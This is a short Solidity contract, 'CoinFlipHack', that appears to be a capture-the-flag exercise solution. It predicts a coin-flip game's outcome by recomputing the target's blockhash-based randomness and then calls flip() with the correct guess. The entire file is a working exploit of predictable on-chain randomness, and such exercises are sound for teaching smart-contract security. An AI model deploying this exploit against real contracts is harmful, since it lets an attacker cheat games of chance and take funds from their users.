// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipHack {
    CoinFlip private _coinFlip;
    uint256 private lastHash;
    uint256 private FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    bool public guessSide;

    constructor(address _addr) {
        _coinFlip = CoinFlip(_addr);
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 currentCoinFlip = uint256(uint256(blockValue) / FACTOR);
        guessSide = currentCoinFlip == 1 ? true : false;
        _coinFlip.flip(guessSide);
    }
}
